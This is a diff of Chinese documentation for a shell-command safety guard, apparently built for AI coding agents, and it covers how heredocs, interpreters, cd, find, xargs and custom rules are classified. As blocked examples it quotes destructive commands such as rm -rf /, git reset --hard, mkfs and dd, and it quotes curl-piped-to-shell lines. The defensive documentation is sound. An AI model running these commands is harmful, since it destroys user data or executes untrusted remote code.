@@ -32,7 +32,7 @@ Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护�
 - **即使无法解析，可识别的破坏性文本仍然会被阻止。** `git reset --hard 'unterminated` 会被原始文本启发式扫描阻止，该扫描可识别 `rm -rf`、`git reset --hard`/`--merge`、`git clean -f`、`git checkout --force`、`git push --force`/`--delete`、`git branch -D`、`git tag -d`、`git stash drop`/`clear`、`git checkout --`、`git restore`、`find -delete`、`dd of=/dev/`、`mkfs /dev/`、`shred <arg>`，以及把下载内容经管道交给 shell 的写法（`curl … | sh`）。
 - **带引号的字面量赋值中的危险文本延后到使用时判定。** `W='rm -rf ~'; echo "$W"` 会被允许：赋值本身不执行操作，而且参数位置中带引号的展开仍是一个 argv word，不能拆成命令和标志。任何风险更高的引用方式（未加引号、位于命令位置、位于替换中或位于未加引号的 heredoc body 中）仍会在赋值时触发阻止。把值交给 shell（`eval "$W"`、`bash -c "$W"`、`echo "$W" | sh`）也会拒绝，因为无法验证 shell 执行来源。Strict 从不延后判定。见[仅标准允许](/zh-Hans/reference/allowed-commands#standard-only-allowances)。
 - **不会一律阻止动态 `rm -rf` 目标。** Standard 允许 `rm -rf "$target"`；只有启用 fail-closed 能力后才会阻止。
-- Standard 还会允许动态可执行文件名、通过替换拼接的受防护命令结构、其他无法验证的递归删除目标，以及只检查内置敏感路径元数据的独立命令。
+- Standard 还会允许动态可执行文件名、通过替换拼接的受防护命令结构、其他无法验证的递归删除目标，以及对内置敏感路径的仅元数据检查，无论它单独出现还是只占复合命令中的一段。
 - **对可验证的本地生成命令执行 `eval` 和 `source` 是允许的。** `eval "$(ssh-agent -s)"` 和 `source <(kubectl completion bash)` 在 standard 下放行，前提是替换主体为单条完全字面的简单命令，且不是远程抓取命令、shell 或命令包装器。主体仍会照常分析，它打印出来的那段 shell 则不会。Strict 和 paranoid 拒绝所有动态 shell 执行来源。见[仅标准允许](/zh-Hans/reference/allowed-commands#standard-only-allowances)。
 - Standard 绝不放宽**敏感内容访问**和**配置的拒绝路径**，也绝不放宽灾难性保护。
 
@@ -80,11 +80,15 @@ Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护�
 
 默认情况下，引擎会扫描解释器代码中嵌入的破坏性命令。`python -c 'import os; os.system("rm -rf /")'` 会因嵌入的 `rm -rf /` 而被阻止，但解释器单行命令这种形式本身是允许的。[Paranoid 解释器模式](/zh-Hans/configuration/modes#paranoid-interpreters)则无论内容如何，都直接阻止所有单行命令。
 
+危险文本出现在哪里，决定了 standard 如何看待它。位于所有字符串字面量之外的文本，三个级别都会计入。位于字面量内部的文本，只有在某个执行调用能接收到它时，standard 才会计入：字面量位于 `os.system(…)`、`subprocess.run(…)` 这类调用的括号内，或者紧跟在不带括号的 `system`、`exec`、`spawn`、`popen` 之后。含有反引号、`%x` 或 `qx` 的代码会执行自身的文本，因此始终计入。执行调用的第一个参数是名称而不是字面量时，代码中的每个字面量也都计入，因为变量可以携带任意字符串。所以 standard 允许 `python3 -c 'import subprocess; print("rm -rf /tmp/x")'`，阻止 `python3 -c 'import os; os.system("rm -rf /tmp/x")'`。Strict 和 paranoid 则只要代码中出现任何执行标记（包括 `subprocess`、`child_process`、`open3`、`eval` 和 `fork`），就阻止这个危险字面量。
+
+进入嵌套分析之前，shell 包装器 `-c` 的 body 中的 `$N`、`${N}`、`$@` 和 `$*` 会被替换为字面量位置参数，因此 `sh -c 'rm -rf "$1"' _ /` 会以 `rm.recursive-force-root-or-home` 阻止。body 内单引号字符串中的引用保持原样。未加引号的引用按默认 `IFS` 拆成多个词，因此 `sh -c 'rm -rf $1' _ 'dist /'` 会因 `/` 这个操作数被阻止。出现以下任一情况时，body 保持不变：有参数不是字面量、body 中提到 `IFS`、未加引号的值含有 glob 字符，或展开超出解析器的输入上限。
+
 `busybox` 分派按特殊情况处理：子命令被移到命令位置后重新分析。引擎会扫描 `awk`/`gawk`/`mawk` 程序中的 `system()` 调用和反引号命令替换。
 
 ### 透明包装器
 
-标准包装器（`sudo`、`env`、`command`、`builtin`）始终会被剥离。你声明为**透明包装器**的代理命令也会被剥离。声明和约束方式见[自定义规则](/zh-Hans/configuration/custom-rules#transparent-wrappers)；对分类而言，重要的是引擎如何展开它们。
+标准包装器（`sudo`、`env`、`command`、`builtin`）始终会被剥离。命令头按 basename 比较，因此 `/usr/bin/env git reset --hard` 和 `env git reset --hard` 一样会被剥离，并以 `git.reset-hard` 阻止。声明为**透明包装器**的代理命令也会被剥离。声明和约束方式见[自定义规则](/zh-Hans/configuration/custom-rules#transparent-wrappers)；对分类而言，重要的是引擎如何展开它们。
 
 展开过程会查找包装器标志和环境变量赋值后的第一个*可保护*子命令，或显式 `--` 后的 token。展开后，内置分析和**自定义规则**都会应用于子命令：`rtk git reset --hard` 会命中内置规则，`rtk docker system prune` 会命中匹配的自定义规则。没有任何保护适用的子命令不会被展开。
 
@@ -125,25 +129,25 @@ cwd 会在同一条命令的各个命令段之间追踪，`rm` 和 `find` 正是
 Heredoc body 是 stdin 上的文本，由 consumer 决定该文本是数据还是程序。在其他分析器处理命令段之前，引擎会先用一道狭窄的支持门检查命令。只有以下条件**全部**成立时才算通过：
 
 - 命令恰好有一个 heredoc（`<<` 或 `<<-`），并连接到 stdin（fd 0）。
-- heredoc 不展开：分隔符带引号（`<<'EOF'`），或者分隔符不带引号且 body 中不含 `$`、反引号或反斜杠。此时 shell 不做展开和转义处理，body 会逐字节原样送到 consumer。
+- heredoc 不展开：分隔符带引号（`<<'EOF'`），或者分隔符不带引号且 body 中不含 `$`、反引号或反斜杠。此时 shell 不做展开和转义处理，body 会逐字节原样送到 consumer。Standard 只放宽这一条：分隔符不带引号时，只要 body 中没有 `$(` 也没有反引号就同样通过，因此只做变量展开的 body 按数据处理，含 `$HOME` 的 `cat <<EOF` 也会放行。Strict 和 paranoid 仍然拒绝这种 body。
 - 没有其他输入重定向争用 stdin（`<`、`<<`、`<<-`、`<<<`、`<&`、`<>`）。
 - consumer 必须是字面量 `cat`、`tee`、`git apply`、`git commit`、`gh pr create` 或 `gh issue create`。不能有路径前缀，也不能有 `env` 之类的包装器。存在输出进程替换（`>(...)`）时，`cat` 和 `tee` 还会被额外拒绝，因为那会把 body 交给另一个命令。
 
 通过支持门的命令在每个级别都把 body 视为惰性数据。例如，即使 body 中描述了破坏性命令，`cat > note.md <<'EOF'`、`git commit -F - <<'EOF'` 以及 body 为纯文本的 `cat <<EOF` 仍然允许。
 
-对于 `cat`、`tee`、`git commit`、`gh pr create` 和 `gh issue create`，分隔符带引号的 body 还会在敏感路径提取前被遮盖。包含 `credentials` 一词的提交消息不会被视为文件名。遮盖仍然要求引号。不带引号的 body 只要其中没有会展开的内容就能通过支持门，但不会被遮盖，其中形似文件名的 token 仍会被提取。`git apply` body 仍可见，因为 patch 会指明写入的文件。Heredoc 外的命令仍会分析。例如，`cat <<'EOF' && rm -rf ~` 会因 `rm` 而阻止。
+对于 `cat`、`tee`、`git commit`、`gh pr create` 和 `gh issue create`，分隔符带引号的 body 还会在敏感路径提取前被遮盖。包含 `credentials` 一词的提交消息不会被视为文件名。遮盖仍然要求引号。不带引号的 body 无论以哪种方式通过支持门都不会被遮盖，其中形似文件名的 token 仍会被提取。`git apply` body 仍可见，因为 patch 会指明写入的文件。Heredoc 外的命令仍会分析。例如，`cat <<'EOF' && rm -rf ~` 会因 `rm` 而阻止。
 
 未通过支持门的命令在 [strict](#strict) 和 paranoid 中直接拒绝。在 standard 中，body 仍会按以下三条路径之一分析：
 
 1. stdin 上不展开的 heredoc，若交给只做语法检查的 shell（例如 `bash -n`），则视为惰性内容，予以允许。
-2. stdin 上不展开的 heredoc，若交给解释器（`python`/`python2`/`python3`、`node`、`ruby`、`perl`），且命令行上其余每个词都是以 `-` 开头的字面量，则该 body 就是这个解释器的程序。`python3 - <<'PY'` 符合，`python3 tool.py <<'PY'` 不符合，因为此时 stdin 是脚本的数据。body 按解释器规则分析。[Paranoid 解释器](/zh-Hans/configuration/modes#paranoid-interpreters)会直接以 `interpreter.one-liner-paranoid` 阻止它，包含危险代码的 body 以 `interpreter.dangerous-command` 阻止，干净的 body 则允许。
+2. stdin 上不展开的 heredoc 交给解释器（`python`/`python2`/`python3`、`node`、`ruby`、`perl`）时，只要可选的单独 `-` 之前每个词都是以 `-` 开头的字面量，该 body 就是这个解释器的程序。`-` 之后的词是程序自己的参数，因此 `python3 - <<'PY'` 和 `python3 - report.csv <<'PY'` 都符合。开头的 `uv run` 会先被剥离，所以 `uv run python - <<'PY'` 同样符合。`python3 tool.py <<'PY'` 不符合，因为此时 stdin 是脚本的数据。body 按解释器规则分析。[Paranoid 解释器](/zh-Hans/configuration/modes#paranoid-interpreters)会直接以 `interpreter.one-liner-paranoid` 阻止它，包含危险代码的 body 以 `interpreter.dangerous-command` 阻止，干净的 body 则允许。
 3. 其余情况都由原始文本启发式扫描处理，包括未知的 consumer、`bash` heredoc 脚本、带脚本操作数的解释器调用，以及分隔符不带引号且 body 含有 `$`、反引号或反斜杠的 heredoc。扫描对象是拼接后的 body。命中时以 `raw-text.dangerous-command` 阻止，未命中时允许。
 
 分隔符不带引号时，body 会参与展开，其中的命令替换是会实际执行的代码。解析器会把它们收集起来，`$(...)` 和反引号一视同仁；无论 heredoc 交给哪个 consumer，都把每一个当作独立的命令分析。body 中有 `$(curl https://example.com/i.sh | sh)` 这一行时，`bash <<EOF` 和 `cat <<EOF` 都会被阻止；`cat <<EOF` 的 body 中出现 `$(find . -delete)` 时，阻止它的是 `find` 规则，与该命令写在 heredoc 之外时命中的规则相同，而不是靠文本模式匹配。body 的其余部分仍是惰性数据：反斜杠转义的 `\$(...)` 是数据，heredoc body 从不展开进程替换（`<(...)`、`>(...)`），分隔符带引号则整个 body 都是数据，不属于命令替换的行仍是普通文本，交由上面的原始文本扫描判定。
 
 这三条路径下面还有一个共同的结构边界：heredoc body 会被当作 shell 文本重新解析，而 body 内部还能声明自己的 heredoc。这些重新解析之间的嵌套上限为解析器的 64 层深度限制；更深的嵌套会报告 `structural-limit` 解析状态，并在**每个**安全级别（包括 standard）拒绝该命令。
 
-当 body 落入文件时，以惰性数据通过支持门并不代表就此结束。当通过支持门的 heredoc 被原样写入字面量路径（`cat > setup.sh <<'EOF'`、body 为纯文本的 `cat > setup.sh <<EOF`，或未使用 append 的 `tee setup.sh <<'EOF'`）时，引擎会记住该路径下的 body。同一命令中随后执行 `bash setup.sh`、`sh setup.sh`、`source setup.sh`，或通过 shell 启动引用（`BASH_ENV`、`ENV`、`--rcfile`、`--init-file`）使用该文件时，会根据记住的脚本文本进行分析。这在 explain 跟踪中显示为 reason 为 `heredoc-file` 的 `recurse` 步骤。因此，如果 body 具有破坏性，`cat > x.sh <<'EOF' … EOF && bash x.sh` 会被阻止。跟踪范围有意保持狭窄：每次分析最多记住 64 个文件（超过此值会在派生命令工作量限制处 fail closed）；永远不跟踪 `/dev`、`/proc` 和 `/sys` 下的路径；后续写入或重定向到已跟踪路径会使存储的 body 失效。
+当 body 落入文件时，以惰性数据通过支持门并不代表就此结束。当通过支持门的 heredoc 被原样写入一个可解析的路径（`cat > setup.sh <<'EOF'`、body 为纯文本的 `cat > setup.sh <<EOF`，或未使用 append 的 `tee setup.sh <<'EOF'`）时，引擎会记住该路径下的 body。在 standard 中，只做变量展开的无引号 body 同样能通过支持门，因此它写出的脚本也会被记住。路径既可以是字面量，也可以是一个[能从字面量赋值展开](#工作目录追踪)的 `$VAR` 或 `${VAR}` 词。同一命令中随后执行 `bash setup.sh`、`sh setup.sh`、`source setup.sh`，或通过 shell 启动引用（`BASH_ENV`、`ENV`、`--rcfile`、`--init-file`）使用该文件时，会根据记住的脚本文本进行分析。这在 explain 跟踪中显示为 reason 为 `heredoc-file` 的 `recurse` 步骤。因此，如果 body 具有破坏性，`cat > x.sh <<'EOF' … EOF && bash x.sh` 会被阻止。跟踪范围有意保持狭窄：每次分析最多记住 64 个文件（超过此值会在派生命令工作量限制处 fail closed）；永远不跟踪 `/dev`、`/proc` 和 `/sys` 下的路径；后续写入或重定向到已跟踪路径会使存储的 body 失效。
 
 <span id="brace-expansion"></span>
 
@@ -192,13 +196,15 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 ## 工作目录追踪
 
-分析器在同一条命令的各个命令段之间维护一个实际工作目录。`cd` 的目标若是字面量且能解析，解析结果就成为被追踪的 cwd；分析器解析不了的目标则把 cwd 置为未知，`rm` 分析随之失去 cwd 锚点。无论哪种情况，原始 cwd 都仍作为锚点保留，因此下面的分类会同时用到这两个目录。
+分析器在同一条命令的各个命令段之间维护一个实际工作目录。`cd` 的目标若能解析到一个已存在的目录，解析结果就成为被追踪的 cwd。分析器解析不了的目标，以及解析结果不是目录的目标，都会把 cwd 置为未知。此时 `rm` 分析失去 cwd 锚点，因此 `cd notes.txt; rm -rf .git` 中的 `.git` 是在没有锚点的情况下判定的，而不是当作位于 `notes.txt` 之下。无论哪种情况，原始 cwd 都仍作为锚点保留，因此下面的分类会同时用到这两个目录。
 
 `pushd` 和 `popd` 始终把 cwd 置为未知，只有 `cd` 会被追踪。
 
 **哪些 `cd` 写法会被追踪。** 选项只读到第一个非选项 token 为止，且其中每一个都必须是 `-L`/`-P` 组合；可选的 `--` 之后还必须恰好剩下一个操作数。因此 `cd -- /tmp/scratch` 和 `cd -P /tmp/scratch` 会被追踪。`cd -`、带未知选项的写法（如 `cd -x -- /tmp/scratch`）、`cd /tmp/scratch -P`、`cd -P /tmp/scratch -L` 和 `cd /tmp/scratch extra`，都会把 cwd 置为未知。
 
-**变量操作数。** `$VAR` 或 `${VAR}` 操作数会用随命令携带的字面量 shell 赋值展开，但仅限解析器把该词标记为变量展开的情况。`R=/tmp/scratch; cd $R` 会被追踪；`cd '$R'` 和 `cd \$R` 不会，因为 `$` 是原样交给 shell 的。展开结果中若仍含 `$`、反引号、空白、glob 字符（`*`、`?`、`[`）或开头的 `~`，同样把 cwd 置为未知。赋值在被收集的那一刻就完成展开，与 shell 的行为一致，因此单引号或转义过的 `$` 保持字面量，之后不会再次展开。`A='$B'; B=/tmp/scratch; cd $A` 的 cwd 仍是未知。
+**变量操作数。** `$VAR` 或 `${VAR}` 操作数会用随命令携带的字面量 shell 赋值展开，但仅限解析器把该词标记为变量展开的情况。`R=/tmp/scratch; cd $R` 会被追踪；`cd '$R'` 和 `cd \$R` 不会，因为 `$` 是原样交给 shell 的。展开结果中若仍含 `$`、反引号、空白或 glob 字符（`*`、`?`、`[`），或者开头是 `~` 或 `-`，同样把 cwd 置为未知。赋值在被收集的那一刻就完成展开，与 shell 的行为一致，因此单引号或转义过的 `$` 保持字面量，之后不会再次展开。`A='$B'; B=/tmp/scratch; cd $A` 的 cwd 仍是未知。
+
+同样的展开还用在另外三类操作数上。一是 shell 脚本操作数：standard 中 `S=/tmp/scratch; bash $S/build.sh` 按它的字面写法分析，而 strict 和 paranoid 仍把它当作动态 shell 执行来源。二是 `cat` 或 `tee` 的 heredoc 写出的文件：[heredoc 文件跟踪](#heredoc-分析)按展开后的路径记住 body。三是[临时根目录放宽](#临时根目录放宽)读取的那些词，其中包括 `git -C` 的路径和 `git worktree remove` 的操作数。
 
 **CDPATH。** 不以 `.`、`/` 或盘符开头的裸操作数，只要任一命令段上出现 `CDPATH=` 或 `CDPATH+=`（前面有没有 `export` 都算），或者 hook 环境中设置了 `CDPATH`，就会把 cwd 置为未知。`./sub` 和绝对路径操作数仍被追踪，因为 shell 解析它们时不会查 CDPATH。
 
@@ -206,12 +212,17 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 
 **`for` 循环。** `for NAME in` 后接 1 到 8 个字面量词时，分析状态会按词数分叉，每个分叉都绑定 NAME，且必须全部通过。其他形式的 `for`，包括不带列表的 `for c` 和由命令替换拼出的列表，都不会绑定 NAME。
 
-被追踪的 cwd 参与四项判定：
+**不会失败的 `cd`。** 如果 `cd` 的目标目录在分析时已经存在，就视为必定成功，其失败分支随之丢弃。跟在它后面的 `||` 回退不再分析，后续命令按在该目录中运行来判定。`/tmp/scratch` 存在时，`cd /tmp/scratch || git reset --hard` 被允许；不存在时被阻止。但只要 `cd` 上的重定向不是指向 `/dev/null` 的简单 `<`、`>`、`>>` 或 `>|`，失败分支就会保留，因为这类重定向可能在 `cd` 执行前就失败。因此 `cd /tmp/scratch 2>/dev/null || git reset --hard` 丢弃回退，而 `cd /tmp/scratch <&/dev/null || git reset --hard` 仍会分析回退并阻止。
+
+**由更早的 `mkdir` 创建的目录。** 同一条命令中的 `mkdir` 算作文件系统状态，因此分析器读盘时还不存在的目录，随后的 `cd` 也能追踪。`mkdir -p /tmp/scratch/repo && cd /tmp/scratch/repo && rm -rf build` 是允许的。只有当选项仅限 `-p`、`-v`、`--parents` 和 `--verbose`，并且该 `mkdir` 确实可能成功时，引擎才记录操作数的末段：带 `-p` 时，第一个不是目录的路径分量必须不存在；不带 `-p` 时，父目录必须是目录且末段必须不存在。出现以下任一情况时不记录：某个操作数含有 `..` 分量、某个词无法解析成路径，或该 `mkdir` 位于可能不会执行的 `then`、`do`、`case` 语句块中。
+
+被追踪的 cwd 参与五项判定：
 
 - cwd 自身目标的判定会匹配解析到被追踪 cwd 或原始锚定 cwd 的目标，因此 `cd helpers && rm -rf ..` 是 `rm.recursive-force-cwd-self`，而不是 cwd 内目标。
 - cwd 内目标的判定也用它，因此在工作区内 `cd src && rm -rf build` 仍然允许。
 - Git 元数据保护同样按它解析目标，因此当 `checkout` 是一个仓库时，`cd scratch && rm -rf ../checkout` 会报 `rm.git-metadata`。
 - 落在受信任的临时根目录下的相对路径目标会成为临时目标，即下表中的第 11 步。
+- `find` 的起点为 `.` 或 `./` 时，按被追踪的 cwd 判定，但仅限该目录按真实路径比较位于工作区之外时。在此基础上，只有当该目录位于受信任的临时根目录之下、本身不是那个根目录，且不包含工作区时才放行。`cd /tmp/scratch/video && find . -maxdepth 1 -name 'still-*.jpg' -delete` 按这条判定通过。`src` 在工作区之内，因此 `cd src && find . -delete` 仍被阻止。
 
 只有当 cwd 变为未知时，跟踪才记录 `cwd-change` 步骤；追踪成功的 `cd` 不记录任何步骤。参见 [explain 跟踪](/zh-Hans/reference/explain-trace)。
 
@@ -285,7 +296,26 @@ Git 支持用 `GIT_SSH_COMMAND` 和 `GIT_SSH` 在网络操作期间运行任意�
 | `parallel rm -rf` | rm 由 parallel 的占位符或 stdin 驱动 |
 | `parallel <shell> -c` | 由动态输入触发的 shell 执行 |
 
+`find -exec` 和 `-execdir` 有两种情况算作删除 `find` 找到的路径：exec 命令的头是 `rm` 或 `rmdir`；头是 shell，且其 `-c` body 中出现 `rm` 或 `rmdir` 这个词。两种情况都还要求 exec 参数中某处含有 `{}`。匹配这个词之前会先去掉引号和反斜杠，因此 `sh -c '"rm" -rf "$0"'` 也会命中。这项匹配有意放宽：只看解析出的命令头会漏掉 `exec rm`、`then rm` 和函数体，所以 `find . -exec sh -c 'echo rm "$0"' {} \;` 同样会命中。
+
+**`-name` 过滤条件与 Git 元数据。** 字面量的 `-name` 或 `-iname` 过滤条件可以解除仅由起点触发的 Git 元数据阻止。当起点含有一个仓库时，引擎会扫描受保护的元数据根，查找名称同时匹配所有已收集过滤条件的条目。找不到就解除阻止，因此在仓库中 `find . -name '*.pyc' -exec rm {} +` 是允许的。找得到则保持阻止，因此 `find . -name '*.sample' -exec rm {} +` 和 `find . -name HEAD -exec rm {} +` 仍以 `find.delete-git-metadata` 拒绝。
+
+这次扫描是 fail-closed 的：元数据根是符号链接、目录不可读，或扫描条目超过 50,000 个时，都保持阻止。
+
+以下形式无需扫描即保持阻止：
+
+- 完全没有字面量过滤条件，或者模式不是字面量词，又或者模式中含有 `[` 或 `\`。`find . -type f -exec rm {} +` 和 `find . -name "*.$EXT" -exec rm {} +` 都会被拒绝。
+- 位于动作之后的过滤条件，因此 `find . -delete -name '*.pyc'` 什么也收集不到。
+- 出现 `-name`、`-iname`、`-delete`、`-exec` 系列以及 `-a`、`-and`、`-depth`、`-maxdepth`、`-mindepth`、`-mmin`、`-mtime`、`-newer`、`-size`、`-type` 之外的任何 primary。`!`、`-o` 和 `(` 都属于此类，因此 `find . ! -name '*.pyc' -exec rm {} +` 和 `find . -name '*.pyc' -o -type f -exec rm {} +` 都会被拒绝。
+- 会递归的 exec 命令（`rm -r`）、头是 shell 的 exec、把 `{}` 嵌进更长的词里的参数（如 `{}/.git/index`），以及带固定路径参数的 `-execdir`/`-okdir`。
+
+解除的只是起点触发的那层元数据阻止。`find . -name "*.pyc" -delete` 仍会被拒绝，但规则是 `find.delete` 而不是 `find.delete-git-metadata`。
+
 对于 `xargs` 和 `parallel`，问题在于目标来自动态输入（管道 stdin 或占位符展开），因此无法相对 cwd 验证。`parallel` 的 SSH 远程模式（`-S`/`--sshlogin`）也会禁用 worktree 放宽。
+
+Standard 对 `xargs` 的 shell `-c` body 设了一个例外：只要替换字符串从未落在命令位置上，并且把最坏输入 `/` 代入后 body 仍然无害，插入 body 的输入就算作数据词。因此 `grep -rl TODO src | xargs -I{} sh -c 'echo "--- {}"; head -3 {}'` 是允许的；而 `find . -name '*.log' | xargs -I{} sh -c 'rm -rf {}'` 会以 `xargs.shell-dynamic` 拒绝，因为最坏情况就是 `rm -rf /`。
+
+命令位置的判定比较宽：body 的开头，`;`、`&`、`|`、`(`、`{`、`!`、反引号或换行之后，以及 `then`、`do`、`else`、`elif`、`if`、`while`、`until`、`time`、`command`、`builtin`、`nohup`、`eval`、`exec`、`source` 之后，都算命令位置。前面带 `NAME=value` 赋值或一个开引号，并不会让替换字符串脱离命令位置。body 中只要出现 `case` 这个词就直接失去例外资格，因为 case 分支的 `)` 同样开启一个命令词。`xargs -I{} sh -c '{} --verbose'`、`xargs -I{} sh -c '! {}'` 和 `xargs -I{} sh -c 'case y in x) {};; esac'` 都会被拒绝。Strict 和 paranoid 从不套用这个例外。
 
 CC Safety Net 只从一个 `:::` 参数组展开 `parallel`，展开时使用 `{}` 和 `{n}` 替换字符串。第二个 `:::` 组、从最后一个输入源往回数的 `{-n}`、`{= ... =}` Perl 表达式，以及 `--workdir`/`--wd`，都会以 `parallel.command-stream-dynamic` 拒绝；引擎从未展开过的那些输入形式同样如此：`::::`、`:::+`、`-a`/`--arg-file`、`--colsep`、`--rpl`、`--arg-sep`、`--arg-file-sep` 和 `--env`。引擎仍会展开子命令，也仍会把 `--workdir` 解析为子命令实际运行的目录，因此即使关闭了 `parallel.command-stream-dynamic`，`rm -rf /` 这类[灾难性](/zh-Hans/reference/destructive-rules#catastrophic-rules)目标仍会命中自身的规则而被阻止。把 `:::` 各组展开成作业会计入 derived token 预算，耗尽预算的作业矩阵会 fail closed。
 
@@ -334,7 +364,7 @@ git 的实际工作目录通过遍历前置的全局选项解析得出。`-C <pa
 
 ## 自定义规则
 
-没有内置分析器匹配时，自定义规则会作为 fallback 运行。它们严格只增不减：只能新增阻止，绝不会覆盖内置的阻止或放宽保护。规则以 `<rulebook-name>/<rule-name>` 作为命名空间，先按命令 basename 匹配，之后的匹配方式取决于各自 rulebook 的版本。版本 1 的规则匹配可选的子命令，以及按字面匹配的 `block_args`；短选项会展开，因此 `-Ap` 能匹配 `-A`。`rulebook_version: 2` 的规则改用 `match` 对象匹配：`match.command_path` 中的各个词必须按顺序对应最前面的几个非选项参数，`match.any_args` 要求参数中至少出现其中一个 token，而 `match.exclude_args` 中的 token 只要出现一个，匹配就取消。版本 2 按 token 精确比较，不展开短选项。见[版本 2 匹配](/zh-Hans/configuration/custom-rules#version-2-matching)。
+没有内置分析器匹配时，自定义规则会作为 fallback 运行。它们严格只增不减：只能新增阻止，绝不会覆盖内置的阻止或放宽保护。自定义规则在任意嵌套深度都会运行，因此当内置分析器在 `bash -c`、`sh -c`、`eval` 和函数体内部没有匹配时，针对 `rm`、`rmdir`、`git`、`find`、`xargs` 或 `parallel` 的自定义规则同样适用。规则以 `<rulebook-name>/<rule-name>` 作为命名空间，先按命令 basename 匹配，之后的匹配方式取决于各自 rulebook 的版本。版本 1 的规则匹配可选的子命令，以及按字面匹配的 `block_args`；短选项会展开，因此 `-Ap` 能匹配 `-A`。`rulebook_version: 2` 的规则改用 `match` 对象匹配：`match.command_path` 中的各个词必须按顺序对应最前面的几个非选项参数，`match.any_args` 要求参数中至少出现其中一个 token，而 `match.exclude_args` 中的 token 只要出现一个，匹配就取消。版本 2 按 token 精确比较，不展开短选项。见[版本 2 匹配](/zh-Hans/configuration/custom-rules#version-2-matching)。
 
 完整的编写指南和匹配语义见[自定义规则](/zh-Hans/configuration/custom-rules)。
 
